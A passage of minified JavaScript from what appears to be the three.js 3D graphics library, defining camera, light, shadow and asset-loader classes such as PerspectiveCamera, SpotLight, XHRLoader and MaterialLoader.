THREE.WebGLRenderTargetCube(c,c,{format:THREE.RGBFormat,magFilter:THREE.LinearFilter,minFilter:THREE.LinearFilter});this.updateCubeMap=function(a,b){null===this.parent&&this.updateMatrixWorld();var c=this.renderTarget,m=c.texture.generateMipmaps;c.texture.generateMipmaps=\n!1;c.activeCubeFace=0;a.render(b,d,c);c.activeCubeFace=1;a.render(b,e,c);c.activeCubeFace=2;a.render(b,f,c);c.activeCubeFace=3;a.render(b,g,c);c.activeCubeFace=4;a.render(b,h,c);c.texture.generateMipmaps=m;c.activeCubeFace=5;a.render(b,k,c);a.setRenderTarget(null)}};THREE.CubeCamera.prototype=Object.create(THREE.Object3D.prototype);THREE.CubeCamera.prototype.constructor=THREE.CubeCamera;\nTHREE.OrthographicCamera=function(a,b,c,d,e,f){THREE.Camera.call(this);this.type=\"OrthographicCamera\";this.zoom=1;this.view=null;this.left=a;this.right=b;this.top=c;this.bottom=d;this.near=void 0!==e?e:.1;this.far=void 0!==f?f:2E3;this.updateProjectionMatrix()};\nTHREE.OrthographicCamera.prototype=Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.OrthographicCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.left=a.left;this.right=a.right;this.top=a.top;this.bottom=a.bottom;this.near=a.near;this.far=a.far;this.zoom=a.zoom;this.view=null===a.view?null:Object.assign({},a.view);return this},setViewOffset:function(a,b,c,d,e,f){this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},\nclearViewOffset:function(){this.view=null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=(this.right-this.left)/(2*this.zoom),b=(this.top-this.bottom)/(2*this.zoom),c=(this.right+this.left)/2,d=(this.top+this.bottom)/2,e=c-a,c=c+a,a=d+b,b=d-b;if(null!==this.view)var c=this.zoom/(this.view.width/this.view.fullWidth),b=this.zoom/(this.view.height/this.view.fullHeight),f=(this.right-this.left)/this.view.width,d=(this.top-this.bottom)/this.view.height,e=e+this.view.offsetX/c*f,\nc=e+this.view.width/c*f,a=a-this.view.offsetY/b*d,b=a-this.view.height/b*d;this.projectionMatrix.makeOrthographic(e,c,a,b,this.near,this.far)},toJSON:function(a){a=THREE.Object3D.prototype.toJSON.call(this,a);a.object.zoom=this.zoom;a.object.left=this.left;a.object.right=this.right;a.object.top=this.top;a.object.bottom=this.bottom;a.object.near=this.near;a.object.far=this.far;null!==this.view&&(a.object.view=Object.assign({},this.view));return a}});\nTHREE.PerspectiveCamera=function(a,b,c,d){THREE.Camera.call(this);this.type=\"PerspectiveCamera\";this.fov=void 0!==a?a:50;this.zoom=1;this.near=void 0!==c?c:.1;this.far=void 0!==d?d:2E3;this.focus=10;this.aspect=void 0!==b?b:1;this.view=null;this.filmGauge=35;this.filmOffset=0;this.updateProjectionMatrix()};\nTHREE.PerspectiveCamera.prototype=Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.PerspectiveCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.fov=a.fov;this.zoom=a.zoom;this.near=a.near;this.far=a.far;this.focus=a.focus;this.aspect=a.aspect;this.view=null===a.view?null:Object.assign({},a.view);this.filmGauge=a.filmGauge;this.filmOffset=a.filmOffset;return this},setFocalLength:function(a){a=.5*this.getFilmHeight()/a;this.fov=2*THREE.Math.RAD2DEG*Math.atan(a);\nthis.updateProjectionMatrix()},getFocalLength:function(){var a=Math.tan(.5*THREE.Math.DEG2RAD*this.fov);return.5*this.getFilmHeight()/a},getEffectiveFOV:function(){return 2*THREE.Math.RAD2DEG*Math.atan(Math.tan(.5*THREE.Math.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(a,b,c,d,e,f){this.aspect=a/b;this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,\nwidth:e,height:f};this.updateProjectionMatrix()},clearViewOffset:function(){this.view=null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=this.near,b=a*Math.tan(.5*THREE.Math.DEG2RAD*this.fov)/this.zoom,c=2*b,d=this.aspect*c,e=-.5*d,f=this.view;if(null!==f)var g=f.fullWidth,h=f.fullHeight,e=e+f.offsetX*d/g,b=b-f.offsetY*c/h,d=f.width/g*d,c=f.height/h*c;f=this.filmOffset;0!==f&&(e+=a*f/this.getFilmWidth());this.projectionMatrix.makeFrustum(e,e+d,b-c,b,a,this.far)},toJSON:function(a){a=\nTHREE.Object3D.prototype.toJSON.call(this,a);a.object.fov=this.fov;a.object.zoom=this.zoom;a.object.near=this.near;a.object.far=this.far;a.object.focus=this.focus;a.object.aspect=this.aspect;null!==this.view&&(a.object.view=Object.assign({},this.view));a.object.filmGauge=this.filmGauge;a.object.filmOffset=this.filmOffset;return a}});\nTHREE.StereoCamera=function(){this.type=\"StereoCamera\";this.aspect=1;this.cameraL=new THREE.PerspectiveCamera;this.cameraL.layers.enable(1);this.cameraL.matrixAutoUpdate=!1;this.cameraR=new THREE.PerspectiveCamera;this.cameraR.layers.enable(2);this.cameraR.matrixAutoUpdate=!1};\nObject.assign(THREE.StereoCamera.prototype,{update:function(){var a,b,c,d,e,f=new THREE.Matrix4,g=new THREE.Matrix4;return function(h){if(a!==h.focus||b!==h.fov||c!==h.aspect*this.aspect||d!==h.near||e!==h.far){a=h.focus;b=h.fov;c=h.aspect*this.aspect;d=h.near;e=h.far;var k=h.projectionMatrix.clone(),l=.032*d/a,n=d*Math.tan(THREE.Math.DEG2RAD*b*.5),p,m;g.elements[12]=-.032;f.elements[12]=.032;p=-n*c+l;m=n*c+l;k.elements[0]=2*d/(m-p);k.elements[8]=(m+p)/(m-p);this.cameraL.projectionMatrix.copy(k);\np=-n*c-l;m=n*c-l;k.elements[0]=2*d/(m-p);k.elements[8]=(m+p)/(m-p);this.cameraR.projectionMatrix.copy(k)}this.cameraL.matrixWorld.copy(h.matrixWorld).multiply(g);this.cameraR.matrixWorld.copy(h.matrixWorld).multiply(f)}}()});THREE.Light=function(a,b){THREE.Object3D.call(this);this.type=\"Light\";this.color=new THREE.Color(a);this.intensity=void 0!==b?b:1;this.receiveShadow=void 0};\nTHREE.Light.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Light,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.color.copy(a.color);this.intensity=a.intensity;return this},toJSON:function(a){a=THREE.Object3D.prototype.toJSON.call(this,a);a.object.color=this.color.getHex();a.object.intensity=this.intensity;void 0!==this.groundColor&&(a.object.groundColor=this.groundColor.getHex());void 0!==this.distance&&(a.object.distance=this.distance);void 0!==\nthis.angle&&(a.object.angle=this.angle);void 0!==this.decay&&(a.object.decay=this.decay);void 0!==this.penumbra&&(a.object.penumbra=this.penumbra);return a}});THREE.LightShadow=function(a){this.camera=a;this.bias=0;this.radius=1;this.mapSize=new THREE.Vector2(512,512);this.map=null;this.matrix=new THREE.Matrix4};Object.assign(THREE.LightShadow.prototype,{copy:function(a){this.camera=a.camera.clone();this.bias=a.bias;this.radius=a.radius;this.mapSize.copy(a.mapSize);return this},clone:function(){return(new this.constructor).copy(this)}});\nTHREE.AmbientLight=function(a,b){THREE.Light.call(this,a,b);this.type=\"AmbientLight\";this.castShadow=void 0};THREE.AmbientLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.AmbientLight});THREE.DirectionalLight=function(a,b){THREE.Light.call(this,a,b);this.type=\"DirectionalLight\";this.position.set(0,1,0);this.updateMatrix();this.target=new THREE.Object3D;this.shadow=new THREE.DirectionalLightShadow};\nTHREE.DirectionalLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.DirectionalLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});THREE.DirectionalLightShadow=function(a){THREE.LightShadow.call(this,new THREE.OrthographicCamera(-5,5,5,-5,.5,500))};THREE.DirectionalLightShadow.prototype=Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.DirectionalLightShadow});\nTHREE.HemisphereLight=function(a,b,c){THREE.Light.call(this,a,c);this.type=\"HemisphereLight\";this.castShadow=void 0;this.position.set(0,1,0);this.updateMatrix();this.groundColor=new THREE.Color(b)};THREE.HemisphereLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.HemisphereLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.groundColor.copy(a.groundColor);return this}});\nTHREE.PointLight=function(a,b,c,d){THREE.Light.call(this,a,b);this.type=\"PointLight\";Object.defineProperty(this,\"power\",{get:function(){return 4*this.intensity*Math.PI},set:function(a){this.intensity=a/(4*Math.PI)}});this.distance=void 0!==c?c:0;this.decay=void 0!==d?d:1;this.shadow=new THREE.LightShadow(new THREE.PerspectiveCamera(90,1,.5,500))};\nTHREE.PointLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.PointLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.decay=a.decay;this.shadow=a.shadow.clone();return this}});\nTHREE.SpotLight=function(a,b,c,d,e,f){THREE.Light.call(this,a,b);this.type=\"SpotLight\";this.position.set(0,1,0);this.updateMatrix();this.target=new THREE.Object3D;Object.defineProperty(this,\"power\",{get:function(){return this.intensity*Math.PI},set:function(a){this.intensity=a/Math.PI}});this.distance=void 0!==c?c:0;this.angle=void 0!==d?d:Math.PI/3;this.penumbra=void 0!==e?e:0;this.decay=void 0!==f?f:1;this.shadow=new THREE.SpotLightShadow};\nTHREE.SpotLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.SpotLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.angle=a.angle;this.penumbra=a.penumbra;this.decay=a.decay;this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});THREE.SpotLightShadow=function(){THREE.LightShadow.call(this,new THREE.PerspectiveCamera(50,1,.5,500))};\nTHREE.SpotLightShadow.prototype=Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.SpotLightShadow,update:function(a){var b=2*THREE.Math.RAD2DEG*a.angle,c=this.mapSize.width/this.mapSize.height;a=a.distance||500;var d=this.camera;if(b!==d.fov||c!==d.aspect||a!==d.far)d.fov=b,d.aspect=c,d.far=a,d.updateProjectionMatrix()}});THREE.AudioLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.AudioLoader.prototype,{load:function(a,b,c,d){var e=new THREE.XHRLoader(this.manager);e.setResponseType(\"arraybuffer\");e.load(a,function(a){THREE.AudioContext.decodeAudioData(a,function(a){b(a)})},c,d)}});THREE.Cache={enabled:!1,files:{},add:function(a,b){!1!==this.enabled&&(this.files[a]=b)},get:function(a){if(!1!==this.enabled)return this.files[a]},remove:function(a){delete this.files[a]},clear:function(){this.files={}}};\nTHREE.Loader=function(){this.onLoadStart=function(){};this.onLoadProgress=function(){};this.onLoadComplete=function(){}};\nTHREE.Loader.prototype={constructor:THREE.Loader,crossOrigin:void 0,extractUrlBase:function(a){a=a.split(\"/\");if(1===a.length)return\"./\";a.pop();return a.join(\"/\")+\"/\"},initMaterials:function(a,b,c){for(var d=[],e=0;e<a.length;++e)d[e]=this.createMaterial(a[e],b,c);return d},createMaterial:function(){var a,b,c;return function(d,e,f){function g(a,c,d,g,k){a=e+a;var l=THREE.Loader.Handlers.get(a);null!==l?a=l.load(a):(b.setCrossOrigin(f),a=b.load(a));void 0!==c&&(a.repeat.fromArray(c),1!==c[0]&&(a.wrapS=\nTHREE.RepeatWrapping),1!==c[1]&&(a.wrapT=THREE.RepeatWrapping));void 0!==d&&a.offset.fromArray(d);void 0!==g&&(\"repeat\"===g[0]&&(a.wrapS=THREE.RepeatWrapping),\"mirror\"===g[0]&&(a.wrapS=THREE.MirroredRepeatWrapping),\"repeat\"===g[1]&&(a.wrapT=THREE.RepeatWrapping),\"mirror\"===g[1]&&(a.wrapT=THREE.MirroredRepeatWrapping));void 0!==k&&(a.anisotropy=k);c=THREE.Math.generateUUID();h[c]=a;return c}void 0===a&&(a=new THREE.Color);void 0===b&&(b=new THREE.TextureLoader);void 0===c&&(c=new THREE.MaterialLoader);\nvar h={},k={uuid:THREE.Math.generateUUID(),type:\"MeshLambertMaterial\"},l;for(l in d){var n=d[l];switch(l){case \"DbgColor\":case \"DbgIndex\":case \"opticalDensity\":case \"illumination\":break;case \"DbgName\":k.name=n;break;case \"blending\":k.blending=THREE[n];break;case \"colorAmbient\":case \"mapAmbient\":console.warn(\"THREE.Loader.createMaterial:\",l,\"is no longer supported.\");break;case \"colorDiffuse\":k.color=a.fromArray(n).getHex();break;case \"colorSpecular\":k.specular=a.fromArray(n).getHex();break;case \"colorEmissive\":k.emissive=\na.fromArray(n).getHex();break;case \"specularCoef\":k.shininess=n;break;case \"shading\":\"basic\"===n.toLowerCase()&&(k.type=\"MeshBasicMaterial\");\"phong\"===n.toLowerCase()&&(k.type=\"MeshPhongMaterial\");\"standard\"===n.toLowerCase()&&(k.type=\"MeshStandardMaterial\");break;case \"mapDiffuse\":k.map=g(n,d.mapDiffuseRepeat,d.mapDiffuseOffset,d.mapDiffuseWrap,d.mapDiffuseAnisotropy);break;case \"mapDiffuseRepeat\":case \"mapDiffuseOffset\":case \"mapDiffuseWrap\":case \"mapDiffuseAnisotropy\":break;case \"mapEmissive\":k.emissiveMap=\ng(n,d.mapEmissiveRepeat,d.mapEmissiveOffset,d.mapEmissiveWrap,d.mapEmissiveAnisotropy);break;case \"mapEmissiveRepeat\":case \"mapEmissiveOffset\":case \"mapEmissiveWrap\":case \"mapEmissiveAnisotropy\":break;case \"mapLight\":k.lightMap=g(n,d.mapLightRepeat,d.mapLightOffset,d.mapLightWrap,d.mapLightAnisotropy);break;case \"mapLightRepeat\":case \"mapLightOffset\":case \"mapLightWrap\":case \"mapLightAnisotropy\":break;case \"mapAO\":k.aoMap=g(n,d.mapAORepeat,d.mapAOOffset,d.mapAOWrap,d.mapAOAnisotropy);break;case \"mapAORepeat\":case \"mapAOOffset\":case \"mapAOWrap\":case \"mapAOAnisotropy\":break;\ncase \"mapBump\":k.bumpMap=g(n,d.mapBumpRepeat,d.mapBumpOffset,d.mapBumpWrap,d.mapBumpAnisotropy);break;case \"mapBumpScale\":k.bumpScale=n;break;case \"mapBumpRepeat\":case \"mapBumpOffset\":case \"mapBumpWrap\":case \"mapBumpAnisotropy\":break;case \"mapNormal\":k.normalMap=g(n,d.mapNormalRepeat,d.mapNormalOffset,d.mapNormalWrap,d.mapNormalAnisotropy);break;case \"mapNormalFactor\":k.normalScale=[n,n];break;case \"mapNormalRepeat\":case \"mapNormalOffset\":case \"mapNormalWrap\":case \"mapNormalAnisotropy\":break;case \"mapSpecular\":k.specularMap=\ng(n,d.mapSpecularRepeat,d.mapSpecularOffset,d.mapSpecularWrap,d.mapSpecularAnisotropy);break;case \"mapSpecularRepeat\":case \"mapSpecularOffset\":case \"mapSpecularWrap\":case \"mapSpecularAnisotropy\":break;case \"mapMetalness\":k.metalnessMap=g(n,d.mapMetalnessRepeat,d.mapMetalnessOffset,d.mapMetalnessWrap,d.mapMetalnessAnisotropy);break;case \"mapMetalnessRepeat\":case \"mapMetalnessOffset\":case \"mapMetalnessWrap\":case \"mapMetalnessAnisotropy\":break;case \"mapRoughness\":k.roughnessMap=g(n,d.mapRoughnessRepeat,\nd.mapRoughnessOffset,d.mapRoughnessWrap,d.mapRoughnessAnisotropy);break;case \"mapRoughnessRepeat\":case \"mapRoughnessOffset\":case \"mapRoughnessWrap\":case \"mapRoughnessAnisotropy\":break;case \"mapAlpha\":k.alphaMap=g(n,d.mapAlphaRepeat,d.mapAlphaOffset,d.mapAlphaWrap,d.mapAlphaAnisotropy);break;case \"mapAlphaRepeat\":case \"mapAlphaOffset\":case \"mapAlphaWrap\":case \"mapAlphaAnisotropy\":break;case \"flipSided\":k.side=THREE.BackSide;break;case \"doubleSided\":k.side=THREE.DoubleSide;break;case \"transparency\":console.warn(\"THREE.Loader.createMaterial: transparency has been renamed to opacity\");\nk.opacity=n;break;case \"depthTest\":case \"depthWrite\":case \"colorWrite\":case \"opacity\":case \"reflectivity\":case \"transparent\":case \"visible\":case \"wireframe\":k[l]=n;break;case \"vertexColors\":!0===n&&(k.vertexColors=THREE.VertexColors);\"face\"===n&&(k.vertexColors=THREE.FaceColors);break;default:console.error(\"THREE.Loader.createMaterial: Unsupported\",l,n)}}\"MeshBasicMaterial\"===k.type&&delete k.emissive;\"MeshPhongMaterial\"!==k.type&&delete k.specular;1>k.opacity&&(k.transparent=!0);c.setTextures(h);\nreturn c.parse(k)}}()};THREE.Loader.Handlers={handlers:[],add:function(a,b){this.handlers.push(a,b)},get:function(a){for(var b=this.handlers,c=0,d=b.length;c<d;c+=2){var e=b[c+1];if(b[c].test(a))return e}return null}};THREE.XHRLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.XHRLoader.prototype,{load:function(a,b,c,d){void 0!==this.path&&(a=this.path+a);var e=this,f=THREE.Cache.get(a);if(void 0!==f)return b&&setTimeout(function(){b(f)},0),f;var g=new XMLHttpRequest;g.overrideMimeType(\"text/plain\");g.open(\"GET\",a,!0);g.addEventListener(\"load\",function(c){var f=c.target.response;THREE.Cache.add(a,f);200===this.status?(b&&b(f),e.manager.itemEnd(a)):0===this.status?(console.warn(\"THREE.XHRLoader: HTTP Status 0 received.\"),b&&b(f),e.manager.itemEnd(a)):\n(d&&d(c),e.manager.itemError(a))},!1);void 0!==c&&g.addEventListener(\"progress\",function(a){c(a)},!1);g.addEventListener(\"error\",function(b){d&&d(b);e.manager.itemError(a)},!1);void 0!==this.responseType&&(g.responseType=this.responseType);void 0!==this.withCredentials&&(g.withCredentials=this.withCredentials);g.send(null);e.manager.itemStart(a);return g},setPath:function(a){this.path=a;return this},setResponseType:function(a){this.responseType=a;return this},setWithCredentials:function(a){this.withCredentials=\na;return this}});THREE.FontLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};Object.assign(THREE.FontLoader.prototype,{load:function(a,b,c,d){var e=this;(new THREE.XHRLoader(this.manager)).load(a,function(a){var c;try{c=JSON.parse(a)}catch(d){console.warn(\"THREE.FontLoader: typeface.js support is being deprecated. Use typeface.json instead.\"),c=JSON.parse(a.substring(65,a.length-2))}a=e.parse(c);b&&b(a)},c,d)},parse:function(a){return new THREE.Font(a)}});\nTHREE.ImageLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.ImageLoader.prototype,{load:function(a,b,c,d){var e=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"img\");e.onload=function(){URL.revokeObjectURL(e.src);b&&b(e)};if(0===a.indexOf(\"data:\"))e.src=a;else{var f=new THREE.XHRLoader(this.manager);f.setPath(this.path);f.setResponseType(\"blob\");f.load(a,function(a){e.src=URL.createObjectURL(a)},c,d)}return e},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});\nTHREE.JSONLoader=function(a){\"boolean\"===typeof a&&(console.warn(\"THREE.JSONLoader: showStatus parameter has been removed from constructor.\"),a=void 0);this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this.withCredentials=!1};\nObject.assign(THREE.JSONLoader.prototype,{load:function(a,b,c,d){var e=this,f=this.texturePath&&\"string\"===typeof this.texturePath?this.texturePath:THREE.Loader.prototype.extractUrlBase(a),g=new THREE.XHRLoader(this.manager);g.setWithCredentials(this.withCredentials);g.load(a,function(c){c=JSON.parse(c);var d=c.metadata;if(void 0!==d&&(d=d.type,void 0!==d)){if(\"object\"===d.toLowerCase()){console.error(\"THREE.JSONLoader: \"+a+\" should be loaded with THREE.ObjectLoader instead.\");return}if(\"scene\"===\nd.toLowerCase()){console.error(\"THREE.JSONLoader: \"+a+\" should be loaded with THREE.SceneLoader instead.\");return}}c=e.parse(c,f);b(c.geometry,c.materials)},c,d)},setTexturePath:function(a){this.texturePath=a},parse:function(a,b){var c=new THREE.Geometry,d=void 0!==a.scale?1/a.scale:1;(function(b){var d,g,h,k,l,n,p,m,q,r,s,t,u,v=a.faces;n=a.vertices;var C=a.normals,w=a.colors,E=0;if(void 0!==a.uvs){for(d=0;d<a.uvs.length;d++)a.uvs[d].length&&E++;for(d=0;d<E;d++)c.faceVertexUvs[d]=[]}k=0;for(l=n.length;k<\nl;)d=new THREE.Vector3,d.x=n[k++]*b,d.y=n[k++]*b,d.z=n[k++]*b,c.vertices.push(d);k=0;for(l=v.length;k<l;)if(b=v[k++],q=b&1,h=b&2,d=b&8,p=b&16,r=b&32,n=b&64,b&=128,q){q=new THREE.Face3;q.a=v[k];q.b=v[k+1];q.c=v[k+3];s=new THREE.Face3;s.a=v[k+1];s.b=v[k+2];s.c=v[k+3];k+=4;h&&(h=v[k++],q.materialIndex=h,s.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<E;d++)for(t=a.uvs[d],c.faceVertexUvs[d][h]=[],c.faceVertexUvs[d][h+1]=[],g=0;4>g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),2!==g&&c.faceVertexUvs[d][h].push(u),\n0!==g&&c.faceVertexUvs[d][h+1].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]),s.normal.copy(q.normal));if(r)for(d=0;4>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),2!==d&&q.vertexNormals.push(r),0!==d&&s.vertexNormals.push(r);n&&(n=v[k++],n=w[n],q.color.setHex(n),s.color.setHex(n));if(b)for(d=0;4>d;d++)n=v[k++],n=w[n],2!==d&&q.vertexColors.push(new THREE.Color(n)),0!==d&&s.vertexColors.push(new THREE.Color(n));c.faces.push(q);c.faces.push(s)}else{q=new THREE.Face3;q.a=v[k++];q.b=\nv[k++];q.c=v[k++];h&&(h=v[k++],q.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<E;d++)for(t=a.uvs[d],c.faceVertexUvs[d][h]=[],g=0;3>g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),c.faceVertexUvs[d][h].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]));if(r)for(d=0;3>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),q.vertexNormals.push(r);n&&(n=v[k++],q.color.setHex(w[n]));if(b)for(d=0;3>d;d++)n=v[k++],q.vertexColors.push(new THREE.Color(w[n]));c.faces.push(q)}})(d);(function(){var b=\nvoid 0!==a.influencesPerVertex?a.influencesPerVertex:2;if(a.skinWeights)for(var d=0,g=a.skinWeights.length;d<g;d+=b)c.skinWeights.push(new THREE.Vector4(a.skinWeights[d],1<b?a.skinWeights[d+1]:0,2<b?a.skinWeights[d+2]:0,3<b?a.skinWeights[d+3]:0));if(a.skinIndices)for(d=0,g=a.skinIndices.length;d<g;d+=b)c.skinIndices.push(new THREE.Vector4(a.skinIndices[d],1<b?a.skinIndices[d+1]:0,2<b?a.skinIndices[d+2]:0,3<b?a.skinIndices[d+3]:0));c.bones=a.bones;c.bones&&0<c.bones.length&&(c.skinWeights.length!==\nc.skinIndices.length||c.skinIndices.length!==c.vertices.length)&&console.warn(\"When skinning, number of vertices (\"+c.vertices.length+\"), skinIndices (\"+c.skinIndices.length+\"), and skinWeights (\"+c.skinWeights.length+\") should match.\")})();(function(b){if(void 0!==a.morphTargets)for(var d=0,g=a.morphTargets.length;d<g;d++){c.morphTargets[d]={};c.morphTargets[d].name=a.morphTargets[d].name;c.morphTargets[d].vertices=[];for(var h=c.morphTargets[d].vertices,k=a.morphTargets[d].vertices,l=0,n=k.length;l<\nn;l+=3){var p=new THREE.Vector3;p.x=k[l]*b;p.y=k[l+1]*b;p.z=k[l+2]*b;h.push(p)}}if(void 0!==a.morphColors&&0<a.morphColors.length)for(console.warn('THREE.JSONLoader: \"morphColors\" no longer supported. Using them as face colors.'),b=c.faces,h=a.morphColors[0].colors,d=0,g=b.length;d<g;d++)b[d].color.fromArray(h,3*d)})(d);(function(){var b=[],d=[];void 0!==a.animation&&d.push(a.animation);void 0!==a.animations&&(a.animations.length?d=d.concat(a.animations):d.push(a.animations));for(var g=0;g<d.length;g++){var h=\nTHREE.AnimationClip.parseAnimation(d[g],c.bones);h&&b.push(h)}c.morphTargets&&(d=THREE.AnimationClip.CreateClipsFromMorphTargetSequences(c.morphTargets,10),b=b.concat(d));0<b.length&&(c.animations=b)})();c.computeFaceNormals();c.computeBoundingSphere();if(void 0===a.materials||0===a.materials.length)return{geometry:c};d=THREE.Loader.prototype.initMaterials(a.materials,b,this.crossOrigin);return{geometry:c,materials:d}}});\nTHREE.LoadingManager=function(a,b,c){var d=this,e=!1,f=0,g=0;this.onStart=void 0;this.onLoad=a;this.onProgress=b;this.onError=c;this.itemStart=function(a){g++;if(!1===e&&void 0!==d.onStart)d.onStart(a,f,g);e=!0};this.itemEnd=function(a){f++;if(void 0!==d.onProgress)d.onProgress(a,f,g);if(f===g&&(e=!1,void 0!==d.onLoad))d.onLoad()};this.itemError=function(a){if(void 0!==d.onError)d.onError(a)}};THREE.DefaultLoadingManager=new THREE.LoadingManager;\nTHREE.BufferGeometryLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.BufferGeometryLoader.prototype,{load:function(a,b,c,d){var e=this;(new THREE.XHRLoader(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},parse:function(a){var b=new THREE.BufferGeometry,c=a.data.index,d={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:Uint8ClampedArray,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};void 0!==c&&(c=new d[c.type](c.array),b.setIndex(new THREE.BufferAttribute(c,\n1)));var e=a.data.attributes,f;for(f in e){var g=e[f],c=new d[g.type](g.array);b.addAttribute(f,new THREE.BufferAttribute(c,g.itemSize,g.normalized))}d=a.data.groups||a.data.drawcalls||a.data.offsets;if(void 0!==d)for(f=0,c=d.length;f!==c;++f)e=d[f],b.addGroup(e.start,e.count,e.materialIndex);a=a.data.boundingSphere;void 0!==a&&(d=new THREE.Vector3,void 0!==a.center&&d.fromArray(a.center),b.boundingSphere=new THREE.Sphere(d,a.radius));return b}});\nTHREE.MaterialLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this.textures={}};\nObject.assign(THREE.MaterialLoader.prototype,{load:function(a,b,c,d){var e=this;(new THREE.XHRLoader(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},setTextures:function(a){this.textures=a},getTexture:function(a){var b=this.textures;void 0===b[a]&&console.warn(\"THREE.MaterialLoader: Undefined texture\",a);return b[a]},parse:function(a){var b=new THREE[a.type];void 0!==a.uuid&&(b.uuid=a.uuid);void 0!==a.name&&(b.name=a.name);void 0!==a.color&&b.color.setHex(a.color);void 0!==a.roughness&&\n(b.roughness=a.roughness);void 0!==a.metalness&&(b.metalness=a.metalness);void 0!==a.emissive&&b.emissive.setHex(a.emissive);void 0!==a.specular&&b.specular.setHex(a.specular);void 0!==a.shininess&&(b.shininess=a.shininess);void 0!==a.uniforms&&(b.uniforms=a.uniforms);void 0!==a.vertexShader&&(b.vertexShader=a.vertexShader);void 0!==a.fragmentShader&&(b.fragmentShader=a.fragmentShader);void 0!==a.vertexColors&&(b.vertexColors=a.vertexColors);void 0!==a.shading&&(b.shading=a.shading);void 0!==a.blending&&\n(b.blending=a.blending);void 0!==a.side&&(b.side=a.side);void 0!==a.opacity&&(b.opacity=a.opacity);void 0!==a.transparent&&(b.transparent=a.transparent);void 0!==a.alphaTest&&(b.alphaTest=a.alphaTest);void 0!==a.depthTest&&(b.depthTest=a.depthTest);void 0!==a.depthWrite&&(b.depthWrite=a.depthWrite);void 0!==a.colorWrite&&(b.colorWrite=a.colorWrite);void 0!==a.wireframe&&(b.wireframe=a.wireframe);void 0!==a.wireframeLinewidth&&(b.wireframeLinewidth=a.wireframeLinewidth);void 0!==a.size&&(b.size=a.size);\nvoid 0!==a.sizeAttenuation&&(b.sizeAttenuation=a.sizeAttenuation);void 0!==a.map&&(b.map=this.getTexture(a.map));void 0!==a.alphaMap&&(b.alphaMap=this.getTexture(a.alphaMap),b.transparent=!0);void 0!==a.bumpMap&&(b.bumpMap=this.getTexture(a.bumpMap));void 0!==a.bumpScale&&(b.bumpScale=a.bumpScale);void 0!==a.normalMap&&(b.normalMap=this.getTexture(a.normalMap));if(void 0!==a.normalScale){var c=a.normalScale;!1===Array.isArray(c)&&(c=[c,c]);b.normalScale=(new THREE.Vector2).fromArray(c)}void 0!==a.displacementMap&&\n(b.displacementMap=this.getTexture(a.displacementMap));void 0!==a.displacementScale&&(b.displacementScale=a.displacementScale);void 0!==a.displacementBias&&(b.displacementBias=a.displacementBias);void 0!==a.roughnessMap&&(b.roughnessMap=this.getTexture(a.roughnessMap));void 0!==a.metalnessMap&&(b.metalnessMap=this.getTexture(a.metalnessMap));void 0!==a.emissiveMap&&(b.emissiveMap=this.getTexture(a.emissiveMap));void 0!==a.emissiveIntensity&&(b.emissiveIntensity=a.emissiveIntensity);void 0!==a.specularMap&&\n(b.specularMap=this.getTexture(a.specularMap));void 0!==a.envMap&&(b.envMap=this.getTexture(a.envMap),b.combine=THREE.MultiplyOperation);void 0!==a.reflectivity&&(b.reflectivity=a.reflectivity);void 0!==a.lightMap&&(b.lightMap=this.getTexture(a.lightMap));void 